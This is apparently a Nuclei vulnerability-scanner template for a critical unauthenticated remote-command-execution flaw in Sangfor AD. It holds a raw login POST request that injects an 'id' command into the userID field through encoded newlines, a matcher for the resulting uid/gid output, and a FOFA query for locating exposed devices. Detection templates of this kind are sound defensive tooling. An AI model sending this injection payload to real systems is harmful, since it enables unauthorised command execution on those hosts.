http:
- matchers:
  - part: body
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /rep/login HTTP/1.1

    Host: {{Hostname}}

    Accept: */*

    Content-Type: application/x-www-form-urlencoded; charset=UTF-8

    X-Requested-With: XMLHttpRequest

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
    like Gecko) Chrome/114.0.5735.199 Safari/537.36

    Accept-Encoding: gzip, deflate

    Accept-Language: zh-CN,zh;q=0.9

    Connection: close


    clsMode=cls_mode_login&index=index&log_type=report&page=login&rnd=0.7550103466497915&userID=admin%0Aid%0A&userPsw=tmbhuisq

    '
id: sangfor-ad-login-rce
info:
  author: Co5mos
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  description: 'Sangfor AD allows remote unauthenticated users to to execute arbitrary
    commands.

    '
  metadata:
    fofa-query: app="sangfor"
    max-request: 1
    verified: true
  name: Sangfor AD - Remote Code Execution
  severity: critical
  tags: sangfor,rce
